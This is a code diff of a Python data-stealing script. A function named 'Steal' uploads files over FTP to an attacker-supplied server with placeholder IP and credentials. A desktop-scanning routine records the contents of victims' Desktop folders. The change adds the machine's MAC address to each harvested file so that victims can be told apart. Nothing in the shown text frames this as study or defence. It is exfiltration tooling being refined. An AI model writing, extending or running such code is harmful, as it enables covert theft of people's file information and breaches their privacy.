@@ -1,13 +1,14 @@
 import ftplib
 import os
+import uuid
 
 
 
 def Steal(filename):
-    ip = '------------' # insert ip address
+    ip = '------------------' # insert ip address
     port = 21
-    username = '---------' # insert username
-    password = '---------' # insert password
+    username = '------------' # insert username
+    password = '-----------------' # insert password
 
     ftp = ftplib.FTP() # annouce FTP object
     ftp.connect(ip, port)
@@ -58,7 +59,8 @@ def scanDesktop(path='Desktop', upload=False):
 
                 for d in desktop_list:
                     folder = os.path.join(desktop, d)
-                    filename = '{}-desktop.txt'.format(u.replace(' ', '-'))
+                    mac = uuid.uuid1().hex[-12:]
+                    filename = '{}-{}-desktop.txt'.format(mac, u.replace(' ', '-'))
                     with open(filename, 'a', encoding='utf-8') as file:
                         t = '{}\n'.format(folder)
                         file.write(t)
